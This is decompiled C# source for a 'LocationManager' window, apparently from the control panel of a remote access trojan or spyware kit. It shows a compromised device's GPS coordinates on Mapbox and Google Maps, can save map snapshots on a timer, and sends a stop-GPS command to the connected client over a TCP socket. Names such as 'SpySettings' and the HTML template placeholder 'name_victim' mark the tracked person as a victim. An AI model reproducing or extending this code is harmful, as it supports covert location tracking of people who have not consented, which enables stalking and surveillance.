using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000090 RID: 144
[DesignerGenerated]
public partial class LocationManager : Form
{
	// Token: 0x06000669 RID: 1641 RVA: 0x000A33F8 File Offset: 0x000A15F8
	public LocationManager()
	{
		base.Load += this.LocationManager_Load;
		base.KeyDown += this.Map_KeyDown;
		base.Closing += this.LocationManager_Closing;
		this.List = new List<Array>();
		this.waiter1 = new WebClient();
		this.Title = "null";
		this.MouseState = false;
		this.Issilent = false;
		this.tmpFolderUSER = "";
		this.boSave = false;
		this.InitializeComponent();
	}

	// Token: 0x0600066C RID: 1644 RVA: 0x000A3E34 File Offset: 0x000A2034
	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			this.TOpacity.Enabled = false;
		}
	}

	// Token: 0x0600066D RID: 1645 RVA: 0x000A3E7C File Offset: 0x000A207C
	private void LocationManager_Load(object sender, EventArgs e)
	{
		this.SaveToolStripMenuItem.Visible = true;
		this.SaveAsToolStripMenuItem.Visible = true;
		this.Map.ContextMenuStrip = this.ctxMenu;
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\10.ico");
		string text = Data.cityclass.Getinfo(this.classClient.ClientAddressIP);
		string[] array = text.Split(new char[]
		{
			'#'
		});
		this.TextBox1.AppendText("Client Address info\r\n\r\n\r\n\r\n");
		string[] array2 = array;
		foreach (string str in array2)
		{
			this.TextBox1.AppendText(str + "\r\n---\r\n");
		}
		this.Threadingg = new Thread(new ThreadStart(this.Threadings));
		this.Threadingg.Priority = ThreadPriority.Normal;
		this.Threadingg.IsBackground = true;
		this.Threadingg.Start();
		this.Text = this.Title;
		this.TOpacity.Interval = SpySettings.T_Interval;
		this.TOpacity.Enabled = true;
	}

	// Token: 0x0600066E RID: 1646 RVA: 0x000A3F9C File Offset: 0x000A219C
	private void DownloadDataCallback(object sender, DownloadDataCompletedEventArgs e)
	{
		MemoryStream memoryStream = new MemoryStream();
		AutoResetEvent autoResetEvent = (AutoResetEvent)e.UserState;
		checked
		{
			try
			{
				if (!e.Cancelled && e.Error == null)
				{
					byte[] result = e.Result;
					memoryStream.Write(result, 0, result.Length);
					this.classClient.MyServer.BytesReceived += memoryStream.Length;
				}
			}
			finally
			{
				if (memoryStream.Length > 0L)
				{
					Image image = Image.FromStream(memoryStream);
					this.MapView(image);
				}
				autoResetEvent.Set();
			}
		}
	}

	// Token: 0x0600066F RID: 1647 RVA: 0x000032A6 File Offset: 0x000014A6
	private void waiter1_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
	{
		this.Progress(e);
	}

	// Token: 0x06000670 RID: 1648 RVA: 0x000A4040 File Offset: 0x000A2240
	private void Progress(DownloadProgressChangedEventArgs e)
	{
		try
		{
			if (base.InvokeRequired)
			{
				base.Invoke(new LocationManager.Delegate1(this.Progress), new object[]
				{
					e
				});
			}
			else
			{
				this.ProgressBar1.Value = e.ProgressPercentage;
				if (this.ProgressBar1.Value == this.ProgressBar1.Maximum)
				{
					this.ProgressBar1.Value = 0;
				}
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000671 RID: 1649 RVA: 0x000A40C0 File Offset: 0x000A22C0
	private void MapView(Image image)
	{
		try
		{
			if (base.InvokeRequired)
			{
				base.Invoke(new LocationManager.Delegate0(this.MapView), new object[]
				{
					image
				});
			}
			else
			{
				this.Map.Image = image;
				this.Map.Invalidate();
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000672 RID: 1650 RVA: 0x000A4120 File Offset: 0x000A2320
	private void Threadings()
	{
		for (;;)
		{
			Thread.Sleep(10);
			if (this.List.Count > 0)
			{
				try
				{
					this.Latitude = (double)this.List[0].GetValue(0);
					this.Longitude = (double)this.List[0].GetValue(1);
					AutoResetEvent autoResetEvent = new AutoResetEvent(false);
					if (this.waiter1 != null)
					{
						this.waiter1.DownloadDataCompleted -= this.DownloadDataCallback;
					}
					this.waiter1.DownloadDataCompleted += this.DownloadDataCallback;
					Debug.WriteLine(this.FormatLink());
					this.waiter1.DownloadDataAsync(new Uri(this.FormatLink()), autoResetEvent);
					autoResetEvent.WaitOne();
					this.waiter1.Dispose();
					this.List.RemoveAt(0);
				}
				catch (Exception)
				{
					Debug.WriteLine("Error Threading location");
				}
			}
		}
	}

	// Token: 0x06000673 RID: 1651 RVA: 0x000A422C File Offset: 0x000A242C
	private string FormatLink()
	{
		string text = this.Markers;
		text = text.Replace("<Longitude>", Conversions.ToString(this.Longitude)).Replace("<Latitude>", Conversions.ToString(this.Latitude));
		return string.Format("{0}{1}/static/{2}{3}?access_token={4}", new object[]
		{
			this.Link,
			this.style,
			text,
			string.Concat(new string[]
			{
				Conversions.ToString(this.Longitude),
				",",
				Conversions.ToString(this.Latitude),
				")/",
				Conversions.ToString(this.Longitude),
				",",
				Conversions.ToString(this.Latitude),
				",",
				Conversions.ToString(this.Zoom),
				"/",
				Conversions.ToString(this.ImageSize.Width),
				"x",
				Conversions.ToString(this.ImageSize.Height)
			}),
			this.Key
		});
	}

	// Token: 0x06000674 RID: 1652 RVA: 0x000A434C File Offset: 0x000A254C
	private void NextZoom()
	{
		checked
		{
			this.Zoom++;
			if (this.Zoom >= 21)
			{
				this.Zoom = 21;
			}
			this.List.Add(new double[]
			{
				this.Latitude,
				this.Longitude
			});
		}
	}

	// Token: 0x06000675 RID: 1653 RVA: 0x000A43A4 File Offset: 0x000A25A4
	private void BackZoom()
	{
		checked
		{
			this.Zoom--;
			if (this.Zoom <= 1)
			{
				this.Zoom = 1;
			}
			this.List.Add(new double[]
			{
				this.Latitude,
				this.Longitude
			});
		}
	}

	// Token: 0x06000676 RID: 1654 RVA: 0x000A43F8 File Offset: 0x000A25F8
	private void Map_MouseWheel(object sender, MouseEventArgs e)
	{
		if (e.Delta < 0)
		{
			this.BackZoom();
		}
		else if (e.Delta > 0)
		{
			this.NextZoom();
		}
	}

	// Token: 0x06000677 RID: 1655 RVA: 0x000A442C File Offset: 0x000A262C
	private void Map_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyData == Keys.Up)
		{
			this.NextZoom();
		}
		else if (e.KeyData == Keys.Down)
		{
			this.BackZoom();
		}
	}

	// Token: 0x06000678 RID: 1656 RVA: 0x000A4460 File Offset: 0x000A2660
	private void LocationManager_Closing(object sender, CancelEventArgs e)
	{
		if (!this.Issilent && this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				SecurityKey.KeysClient4 + Data.SPL_SOCKET,
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.qitGPS = true;
			this.classClient.SendMessage(parametersObjects);
		}
		try
		{
			this.Threadingg.Abort();
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000679 RID: 1657 RVA: 0x000032AF File Offset: 0x000014AF
	private void Map_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		this.MapBOX();
	}

	// Token: 0x0600067A RID: 1658 RVA: 0x000A44FC File Offset: 0x000A26FC
	private void MapBOX()
	{
		try
		{
			if (this.infoMaps.Length != 0 && Directory.Exists(this.infoMaps[0]))
			{
				string text = this.infoMaps[0] + "\\Location Manager";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				string text2 = Resources.map;
				text2 = text2.Replace("\\\\accessToken:\\\\", this.Key).Replace("\\\\style:\\\\", "mapbox://styles/" + this.style).Replace("\\\\:\\\\,\\\\:\\\\", Conversions.ToString(this.Longitude) + "," + Conversions.ToString(this.Latitude)).Replace("\\\\name_victim:\\\\", this.infoMaps[1]);
				string text3 = text + "\\" + DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
				File.WriteAllText(text3, text2);
				Process.Start(text3);
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x0600067B RID: 1659 RVA: 0x000032B7 File Offset: 0x000014B7
	private void Map_MouseHover(object sender, EventArgs e)
	{
		this.MouseState = true;
		this.Map.Invalidate();
	}

	// Token: 0x0600067C RID: 1660 RVA: 0x000032CB File Offset: 0x000014CB
	private void Map_MouseLeave(object sender, EventArgs e)
	{
		this.MouseState = false;
		this.Map.Invalidate();
	}

	// Token: 0x0600067D RID: 1661 RVA: 0x000A4604 File Offset: 0x000A2804
	private void Map_Paint(object sender, PaintEventArgs e)
	{
		if (this.MouseState & Operators.CompareString(this.Accuracy, "jump", false) != 0 & Operators.CompareString(this.Speed, "jump", false) != 0)
		{
			string text = "Accuracy " + this.Accuracy + " - " + this.Speed;
			SizeF sizeF = default(SizeF);
			sizeF = e.Graphics.MeasureString(text, reso.f);
			Rectangle rect = checked(new Rectangle(5, 5, (int)Math.Round((double)sizeF.Width), (int)Math.Round((double)sizeF.Height)));
			Color defaultColor_Background = SpySettings.DefaultColor_Background;
			e.Graphics.FillRectangle(new Pen(Color.FromArgb(200, (int)defaultColor_Background.R, (int)defaultColor_Background.G, (int)defaultColor_Background.B)).Brush, rect);
			e.Graphics.DrawString(text, reso.f, new SolidBrush(SpySettings.DefaultColor_Foreground), 5f, 5f);
		}
	}

	// Token: 0x0600067E RID: 1662 RVA: 0x000A4710 File Offset: 0x000A2910
	private void OpenUsingGoogleMapsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string fileName = string.Format("https://www.google.com/maps/dir/{0},{1}/@{2},{3},{4}", new object[]
		{
			Conversions.ToString(this.Latitude),
			Conversions.ToString(this.Longitude),
			Conversions.ToString(this.Latitude),
			Conversions.ToString(this.Longitude),
			"17z"
		});
		Process.Start(fileName);
	}

	// Token: 0x0600067F RID: 1663 RVA: 0x000032AF File Offset: 0x000014AF
	private void OpenUsingMapBoxToolStripMenuItem_Click(object sender, EventArgs e)
	{
		this.MapBOX();
	}

	// Token: 0x06000680 RID: 1664 RVA: 0x000A4778 File Offset: 0x000A2978
	private void Savetimer_Tick(object sender, EventArgs e)
	{
		string text = this.tmpFolderUSER + "\\Location Manager";
		if (this.boSave)
		{
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (Directory.Exists(text))
			{
				this.Map.Image.Save(text + "\\p_" + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg);
			}
		}
		else
		{
			this.savetimer.Stop();
			this.savetimer.Dispose();
		}
	}

	// Token: 0x06000681 RID: 1665 RVA: 0x000A480C File Offset: 0x000A2A0C
	private void DrakeUICheckBox1_ValueChanged(object sender, bool value)
	{
		if (this.Map.Image != null)
		{
			if (this.DrakeUICheckBox1.Checked)
			{
				this.savetimer.Start();
				this.boSave = true;
				string text = this.tmpFolderUSER + "\\Location Manager";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				Process.Start(text);
			}
			else
			{
				this.savetimer.Stop();
				this.boSave = false;
			}
		}
	}

	// Token: 0x06000682 RID: 1666 RVA: 0x000A4888 File Offset: 0x000A2A88
	private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (this.infoMaps.Length != 0 && Directory.Exists(this.infoMaps[0]))
			{
				string text = this.infoMaps[0] + "\\Location Manager";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				string text2 = Resources.map;
				text2 = text2.Replace("\\\\accessToken:\\\\", this.Key).Replace("\\\\style:\\\\", "mapbox://styles/" + this.style).Replace("\\\\:\\\\,\\\\:\\\\", Conversions.ToString(this.Longitude) + "," + Conversions.ToString(this.Latitude)).Replace("\\\\name_victim:\\\\", this.infoMaps[1]);
				File.WriteAllText(text + "\\" + DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html", text2);
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000683 RID: 1667 RVA: 0x000A4988 File Offset: 0x000A2B88
	private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (this.infoMaps.Length != 0)
			{
				this.infoMaps[0] + "\\Location Manager";
				string text = Resources.map;
				text = text.Replace("\\\\accessToken:\\\\", this.Key).Replace("\\\\style:\\\\", "mapbox://styles/" + this.style).Replace("\\\\:\\\\,\\\\:\\\\", Conversions.ToString(this.Longitude) + "," + Conversions.ToString(this.Latitude)).Replace("\\\\name_victim:\\\\", this.infoMaps[1]);
				SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
				saveFileDialog.Filter = "html (*.html)|*.html";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					File.WriteAllText(saveFileDialog.FileName, text);
				}
				saveFileDialog.Dispose();
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000684 RID: 1668 RVA: 0x000A4710 File Offset: 0x000A2910
	private void guna2GradientTileButton1_Click(object sender, EventArgs e)
	{
		string fileName = string.Format("https://www.google.com/maps/dir/{0},{1}/@{2},{3},{4}", new object[]
		{
			Conversions.ToString(this.Latitude),
			Conversions.ToString(this.Longitude),
			Conversions.ToString(this.Latitude),
			Conversions.ToString(this.Longitude),
			"17z"
		});
		Process.Start(fileName);
	}

	// Token: 0x0400095C RID: 2396
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Map")]
	private PictureBox _Map;

	// Token: 0x0400095D RID: 2397
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	// Token: 0x0400095E RID: 2398
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveToolStripMenuItem")]
	private ToolStripMenuItem _SaveToolStripMenuItem;

	// Token: 0x0400095F RID: 2399
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveAsToolStripMenuItem")]
	private ToolStripMenuItem _SaveAsToolStripMenuItem;

	// Token: 0x04000960 RID: 2400
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OpenUsingGoogleMapsToolStripMenuItem")]
	private ToolStripMenuItem _OpenUsingGoogleMapsToolStripMenuItem;

	// Token: 0x04000961 RID: 2401
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OpenUsingMapBoxToolStripMenuItem")]
	private ToolStripMenuItem _OpenUsingMapBoxToolStripMenuItem;

	// Token: 0x04000962 RID: 2402
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUICheckBox1")]
	private DrakeUICheckBox _DrakeUICheckBox1;

	// Token: 0x04000963 RID: 2403
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savetimer")]
	private System.Windows.Forms.Timer _savetimer;

	// Token: 0x04000964 RID: 2404
	public string[] infoMaps;

	// Token: 0x04000965 RID: 2405
	public TcpClient Client;

	// Token: 0x04000966 RID: 2406
	public Client classClient;

	// Token: 0x04000967 RID: 2407
	public string Link;

	// Token: 0x04000968 RID: 2408
	public string Key;

	// Token: 0x04000969 RID: 2409
	public double Latitude;

	// Token: 0x0400096A RID: 2410
	public double Longitude;

	// Token: 0x0400096B RID: 2411
	public Size ImageSize;

	// Token: 0x0400096C RID: 2412
	public int Zoom;

	// Token: 0x0400096D RID: 2413
	public string Markers;

	// Token: 0x0400096E RID: 2414
	public List<Array> List;

	// Token: 0x0400096F RID: 2415
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("waiter1")]
	private WebClient _waiter1;

	// Token: 0x04000970 RID: 2416
	public Thread Threadingg;

	// Token: 0x04000971 RID: 2417
	public string style;

	// Token: 0x04000972 RID: 2418
	public string Title;

	// Token: 0x04000973 RID: 2419
	public string Accuracy;

	// Token: 0x04000974 RID: 2420
	public string Speed;

	// Token: 0x04000975 RID: 2421
	private bool MouseState;

	// Token: 0x04000976 RID: 2422
	public bool Issilent;

	// Token: 0x04000977 RID: 2423
	public string tmpFolderUSER;

	// Token: 0x04000978 RID: 2424
	private bool boSave;

	// Token: 0x04000987 RID: 2439
	internal WebClient waiter1;

	// Token: 0x02000091 RID: 145
	// (Invoke) Token: 0x06000686 RID: 1670
	public delegate void Delegate1(DownloadProgressChangedEventArgs e);

	// Token: 0x02000092 RID: 146
	// (Invoke) Token: 0x0600068A RID: 1674
	public delegate void Delegate0(Image image);
}
